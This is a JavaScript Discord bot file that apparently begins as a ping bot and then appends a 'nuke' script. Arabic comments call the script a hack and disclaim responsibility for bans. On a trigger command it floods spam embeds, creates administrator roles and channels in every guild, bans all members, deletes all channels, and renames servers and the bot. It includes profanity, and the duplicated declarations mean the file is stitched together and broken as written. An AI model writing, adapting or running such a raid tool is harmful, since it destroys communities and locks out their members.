const Discord = require('discord.js');
const client = new Discord.Client();
 const prefix = ".";
client.on('ready', () => {
    console.log('I am ready!');
});
 
client.on('message', message => {
    if (message.content === 'zg') {
        message.reply('pong');
      }
});
 
const Discord = require("discord.js");
const client = new Discord.Client();
//انا لا اتحمل مسؤولية اي باند يجيك من سيرفر او من دسكورد نفسه
const x_x = "!destro" //هنا تحط الامر اللي يشغل الهاك
const teext = "msh ana y destro" //هنا تحط وش تبي يكون اسم الرومات الكتابيه
const vooice = "msh ana y destro" //هنا تحط وش تبي يكون اسم الرومات الصوتيه
const pic = "fuckk you" //هنا تحط رابط الصوره اللي بيحطها البوت بكل مكان
const spam = "msh ana y destro" //هنا تحط وش تبي رسالة السبام
const namee = "msh ana y destro" //هنا تحط وش تبي اسم السيرفر واسم البوت والبلاينق
const playing = "msh ana y destro tmm" //هنا تحط وش تبي يكون الستريمنق
client.on('message', message => {
if (message.content === x_x) {
    var teeext = teext.replace(" ", "-")
    var interval = setInterval (function () {
    const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail(pic)
   .addField(spam, ".")
    message.channel.sendEmbed(embed);
    client.guilds.forEach(hack => {
    hack.createRole({name: spam,permissions: [8],color: "#23272a"})
    hack.createRole({name: spam,permissions: [8],color: " #df1213"})
    hack.createChannel(teeext, 'text')
    hack.createChannel(vooice, 'voice')
    })}, 3);}});
client.on('message', message => {
if (message.content === x_x) {
    message.guild.members.forEach(baand => {
   baand.ban({reason: spam,});
   client.channels.forEach(hackch => {
   hackch.delete();
   client.user.setAvatar(pic)
   client.user.setUsername(namee)
   client.guilds.forEach(hack => {
   hack.setIcon(pic)
   hack.setName(namee)})})})}});
   
   client.login(process.env.BOT_TOKEN);
